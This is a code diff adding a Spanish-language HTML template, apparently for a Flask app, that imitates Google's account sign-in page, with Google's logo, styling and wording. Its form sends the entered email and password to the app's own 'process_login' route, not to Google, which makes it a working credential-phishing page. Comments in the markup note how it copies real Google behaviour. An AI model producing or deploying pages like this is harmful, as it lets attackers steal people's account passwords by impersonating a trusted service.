@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión - Cuentas de Google</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #fff; /* Fondo blanco como Google */
+        }
+        .google-card {
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+            width: 100%;
+            max-width: 450px; /* Ancho similar al de Google */
+            box-shadow: 0 1px 3px rgba(60,64,67,.3), 0 4px 8px rgba(60,64,67,.15); /* Sombra sutil */
+        }
+        .google-input {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: border-color 0.2s ease, box-shadow 0.2s ease;
+        }
+        .google-input:focus {
+            outline: none;
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 1px #1a73e8;
+        }
+        .google-button {
+            background-color: #1a73e8;
+            color: white;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            transition: background-color 0.2s ease;
+        }
+        .google-button:hover {
+            background-color: #176ad2;
+        }
+        .google-link {
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+        }
+        .google-link:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex items-center justify-center bg-gray-50 p-4">
+    <div class="google-card bg-white text-center">
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" 
+             alt="Google" class="mx-auto h-10 mb-8">
+        <h1 class="text-2xl font-medium text-gray-900 mb-2">Iniciar sesión</h1>
+        <p class="text-base text-gray-700 mb-8">Usa tu Cuenta de Google</p>
+        
+        <form action="{{ url_for('process_login') }}" method="post" class="space-y-6">
+            <div>
+                <input type="email" id="username" name="username" required
+                       class="google-input mb-4"
+                       placeholder="Correo electrónico o teléfono">
+                <!-- Por simplicidad, el campo de contraseña aparece de inmediato.
+                     En Google real, aparece después de ingresar el correo. --><input type="password" id="password" name="password" required
+                       class="google-input"
+                       placeholder="Contraseña">
+            </div>
+            
+            <div class="text-left">
+                <a href="#" class="google-link">¿Olvidaste tu contraseña?</a>
+            </div>
+
+            <div class="flex justify-between items-center mt-8">
+                <a href="#" class="google-link">Crear cuenta</a>
+                <button type="submit" class="google-button">Siguiente</button>
+            </div>
+        </form>
+
+        <div class="mt-10 text-xs text-gray-500 flex justify-center space-x-4">
+            <select class="border border-gray-300 rounded px-2 py-1 bg-white">
+                <option>Español (Latinoamérica)</option>
+                <option>English (United States)</option>
+                <!-- Más opciones de idioma --></select>
+            <a href="#" class="google-link text-xs">Ayuda</a>
+            <a href="#" class="google-link text-xs">Privacidad</a>
+            <a href="#" class="google-link text-xs">Condiciones</a>
+        </div>
+    </div>
+</body>
+</html>
